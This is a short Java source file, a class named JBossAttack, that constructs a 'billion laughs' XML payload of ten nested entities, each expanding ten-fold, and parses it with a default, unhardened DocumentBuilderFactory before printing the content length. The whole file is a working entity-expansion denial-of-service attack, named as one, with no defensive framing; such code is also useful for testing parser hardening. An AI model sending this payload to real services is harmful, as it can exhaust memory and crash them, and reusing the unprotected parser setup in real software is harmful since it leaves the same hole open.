package org.example;

import java.io.ByteArrayInputStream;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;

public class JBossAttack {
    public static void main(String[] args) throws Exception {

        String xml = "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE val ["
                + "<!ENTITY val \"val\">"
                + "<!ENTITY val1 \"&val;&val;&val;&val;&val;&val;&val;&val;&val;&val;\">"
                + "<!ENTITY val2 \"&val1;&val1;&val1;&val1;&val1;&val1;&val1;&val1;&val1;&val1;\">"
                + "<!ENTITY val3 \"&val2;&val2;&val2;&val2;&val2;&val2;&val2;&val2;&val2;&val2;\">"
                + "<!ENTITY val4 \"&val3;&val3;&val3;&val3;&val3;&val3;&val3;&val3;&val3;&val3;\">"
                + "<!ENTITY val5 \"&val4;&val4;&val4;&val4;&val4;&val4;&val4;&val4;&val4;&val4;\">"
                + "<!ENTITY val6 \"&val5;&val5;&val5;&val5;&val5;&val5;&val5;&val5;&val5;&val5;\">"
                + "<!ENTITY val7 \"&val6;&val6;&val6;&val6;&val6;&val6;&val6;&val6;&val6;&val6;\">"
                + "<!ENTITY val8 \"&val7;&val7;&val7;&val7;&val7;&val7;&val7;&val7;&val7;&val7;\">"
                + "<!ENTITY val9 \"&val8;&val8;&val8;&val8;&val8;&val8;&val8;&val8;&val8;&val8;\">"
                + "]>"
                + "<attack>&val9;</attack>";
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(new ByteArrayInputStream(xml.getBytes()));

        System.out.println("Root Element: " + doc.getDocumentElement().getNodeName());
        System.out.println("Content Length: " + doc.getDocumentElement().getTextContent().length());
    }
}

